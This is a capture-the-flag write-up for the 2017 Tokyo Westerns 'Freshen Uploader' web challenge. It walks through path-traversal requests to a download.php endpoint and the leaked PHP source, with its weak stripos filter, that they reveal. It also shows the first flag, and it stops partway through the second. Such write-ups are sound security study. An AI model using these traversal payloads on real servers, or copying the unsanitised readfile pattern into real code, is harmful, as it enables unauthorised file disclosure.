---
title: "Freshen Uploader Web - Tokyo Westerns CTF 2017"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["lfi", "freshen", "uploader", "web", "web-exploitation", "freshen-uploader-web"]
summary: "In this year, we stopped using Windows so you can't use DOS tricks!"
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2017/Tokyo_Westerns_CTF_2017/Freshen_Uploader/Freshen_Uploader_Web.md"
ctf:
  name: "Tokyo Westerns CTF"
  year: 2017
  challenge: "Freshen Uploader Web"
---

## Source

- **CTF:** Tokyo Westerns CTF 2017
- **Challenge:** Freshen Uploader Web
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2017/Tokyo_Westerns_CTF_2017/Freshen_Uploader/Freshen_Uploader_Web.md>

---
# FRESHEN UPLOADER, Web, no fixed points

## Problem

In this year, we stopped using Windows so you can't use DOS tricks!
http://fup.chal.ctf.westerns.tokyo/

This challenge contained two flags.

## Solution

![Screen caption](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2017/Tokyo_Westerns_CTF_2017/Freshen_Uploader/1.png)

### Flag 1


```HTML
<td>1</td>
            <td>test.cpp</td>
            <td>192 bytes</td>
            <td><a href="https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2017/Tokyo_Westerns_CTF_2017/Freshen_Uploader/download.php?f=6a92b449761226434f5fce6c8e87295a">Download</a></td>
```


uploads/


LFI:

/download.php?f=./uploads/../6a92b449761226434f5fce6c8e87295a


![Screen caption](https://raw.githubusercontent.com/bl4de/ctf/7e48b1a697a898ac7a1e6856a91041afa529a8be/2017/Tokyo_Westerns_CTF_2017/Freshen_Uploader/2.png)


```
GET /download.php?f=../download.php HTTP/1.1
Host: fup.chal.ctf.westerns.tokyo
```

result:

```
HTTP/1.1 200 OK
Date: Sat, 02 Sep 2017 19:59:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Disposition: attachment; filename='../download.php'
Content-Length: 267
Content-Type: application/octet-stream

<?php
// TWCTF{then_can_y0u_read_file_list?}
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename='$filename'");
readfile("uploads/$filename");
```

Flag: **TWCTF{then_can_y0u_read_file_list?}**


### Flag 2


```
GET /download.php?f=../index.php HTTP/1.1
Host: fup.chal.ctf.westerns.tokyo
```

result:

```
HTTP/1.1 200 OK
Date: Sat, 02 Sep 2017 20:00:51 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Disposition: attachment; filename='../index.php'
Content-Length: 1315
Content-Type: application/octet-stream

<?php
/**
 *
 */
include('file_list.php');
?>
<!DOCTYPE html>
<html lang="en">
  <head>
  (...)
```


download.php:

```PHP
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
```
